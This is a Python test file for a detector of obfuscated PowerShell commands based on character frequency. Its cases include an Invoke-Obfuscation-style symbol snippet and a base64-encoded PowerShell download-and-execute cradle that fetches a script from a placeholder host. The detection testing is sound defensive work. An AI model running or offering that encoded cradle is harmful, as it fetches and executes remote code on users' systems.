"""
Teste para o detector de Highly Obfuscated Command (análise de frequência de caracteres).
Verifica se comandos com alta densidade de símbolos são detectados corretamente.
"""
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from services.detectors.char_frequency_detector import detect_high_symbol_density

test_cases = [
    # --- Deve DETECTAR ---
    {
        "name": "Obfuscação pura com variáveis de símbolo",
        "input": '${;}=+$();${=}=${;};${+}=++${;};${@}=++${;};${.}=++${;};${[}=++${;};${]}=++${;};${(}=++${;};${)}=++${;};${&}=++${;};${|}=++${;};${"}="["+"$(@{})"[${)}]+"$(@{})"["${+}${|}"]+"$(@{})"["${@}${=}"]+"$?"[${+}]+"]";',
        "should_detect": True,
        "description": "Invoke-Obfuscation TOKEN\\VARIABLE style — zero alfanuméricos",
    },
    {
        "name": "Alta repetição de $ com poucos alfanuméricos",
        "input": "$" * 45 + "ab" * 5,
        "should_detect": True,
        "description": "45x '$' vs 10 alfanumericos - ratio 4.5",
    },
    {
        "name": "Concatenação maciça de símbolos (string longa)",
        "input": '("" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "" + "AB")',
        "should_detect": True,
        "description": '20x "" com + repetidos vs 2 alfanumericos - ratio alta',
    },
    # --- Não deve detectar ---
    {
        "name": "Comando PS normal",
        "input": "Get-ChildItem -Path C:\\Windows -Recurse -Filter *.txt | Select-Object Name, Length",
        "should_detect": False,
        "description": "Comando legítimo — muitos alfanuméricos, poucos símbolos",
    },
    {
        "name": "Comando curto (abaixo do mínimo de chars)",
        "input": "${;}=+$();",
        "should_detect": False,
        "description": "Muito curto (< 50 chars printáveis) — não deve acionar",
    },
    {
        "name": "Sequência de semicolons com variáveis normais",
        "input": "$a=1;$b=2;$c=3;$d=4;$e=5;$f=6;$g=7;$h=8;$i=9;$j=10;",
        "should_detect": False,
        "description": "Semicolons balanceados com alfanuméricos suficientes",
    },
    {
        "name": "Base64 em EncodedCommand",
        "input": "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
        "should_detect": False,
        "description": "Base64 tem muitos alfanuméricos — ratio baixo",
    },
]


def run_tests():
    print("=" * 70)
    print("TEST: Highly Obfuscated Command detector")
    print("=" * 70)

    passed = 0
    failed = 0

    for case in test_cases:
        result = detect_high_symbol_density(case["input"])
        detected = result is not None
        ok = detected == case["should_detect"]

        status = "PASS" if ok else "FAIL"
        symbol_info = ""
        if result:
            symbol_info = (
                f"  dominant='{result['dominant_symbol']}' "
                f"count={result['dominant_count']} "
                f"alnum={result['non_symbol_count']} "
                f"ratio={result['ratio']:.2f}"
            )

        print(f"\n[{status}] {case['name']}")
        print(f"  {case['description']}")
        print(f"  expected={'DETECT' if case['should_detect'] else 'no-detect'}  "
              f"got={'DETECT' if detected else 'no-detect'}{symbol_info}")

        if ok:
            passed += 1
        else:
            failed += 1

    print("\n" + "=" * 70)
    print(f"Results: {passed} passed, {failed} failed out of {len(test_cases)} tests")
    if failed == 0:
        print("ALL TESTS PASSED")
    else:
        print("SOME TESTS FAILED")
    print("=" * 70)

    return failed == 0


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
